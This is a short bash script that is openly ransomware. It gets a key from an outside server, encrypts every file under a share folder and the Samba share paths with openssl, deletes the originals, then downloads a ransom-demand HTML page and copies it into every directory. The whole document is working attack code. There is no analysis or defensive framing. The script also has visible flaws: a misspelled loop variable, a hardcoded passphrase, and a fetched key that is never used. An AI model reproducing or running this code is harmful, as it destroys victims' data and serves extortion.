#!/bin/bash

# Server where unique key is created
keyServer="https://secure.www-ssl.co"

# Payment demand splash screen
splashLocation="https://raw.githubusercontent.com/absane/Tricks/master/ransom/ransomware_splash.html"

# Folder to encrypt
targetFolder="/share"

# Samba folders only. Set to False to target only $targetFolder
smb=True

#	Encrypt files
. /tmp/dynamicconfig.ini
KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
smb=True
if [ $smb == "True" ]
then
	for targerFolder in $(cat /etc/samba/smb.conf | grep path | cut -d ' ' -f3-99);
	do
		find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
	done
else
	find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
fi


#	Warn user their files are encrypted
curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
find -L $targetFolder -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
